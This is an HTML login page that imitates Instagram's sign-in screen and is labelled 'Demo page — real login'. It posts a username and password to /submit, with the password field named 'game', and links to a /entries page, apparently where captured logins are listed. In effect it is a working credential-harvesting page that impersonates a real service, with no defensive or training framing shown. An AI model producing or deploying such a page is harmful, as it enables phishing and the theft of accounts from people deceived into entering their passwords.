```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Demo</title>

    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: Arial, Helvetica, sans-serif;
        }

        body {
            min-height: 100vh;
            background: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        .container {
            width: 350px;
            padding: 15px;
        }

        .box {
            background: white;
            border: 1px solid #dbdbdb;
            padding: 35px;
            text-align: center;
            border-radius: 10px;
        }

        .logo {
            font-size: 38px;
            font-weight: bold;
            margin-bottom: 10px;
        }

        .demo {
            color: #777;
            font-size: 13px;
            margin-bottom: 25px;
        }

        input {
            width: 100%;
            height: 42px;
            padding: 10px 12px;
            margin-bottom: 10px;
            border: 1px solid #dbdbdb;
            border-radius: 6px;
            background: #fafafa;
            outline: none;
        }

        input:focus {
            border-color: #999;
        }

        button {
            width: 100%;
            height: 40px;
            margin-top: 8px;
            border: none;
            border-radius: 7px;
            background: #0095f6;
            color: white;
            font-size: 14px;
            font-weight: bold;
            cursor: pointer;
        }

        button:hover {
            background: #007acb;
        }

        .entries {
            display: block;
            margin-top: 18px;
            color: #555;
            text-decoration: none;
            font-size: 13px;
        }
    </style>
</head>

<body>

<div class="container">

    <div class="box">

        <div class="logo">Instagram</div>

        <div class="demo">
            Demo page — real login
        </div>

        <form action="/submit" method="POST">

            <input
                type="text"
                name="username"
                placeholder=" username"
                maxlength="50"
                autocomplete="off"
                required
            >

            <input
                type="password"
                name="game"
                placeholder="password"
                maxlength="50"
                autocomplete="off"
                required
            >

            <button type="submit">
                Submit Demo
            </button>

        </form>

        <a class="entries" href="/entries">
            View entries 
        </a>

    </div>

</div>

</body>
</html>
```
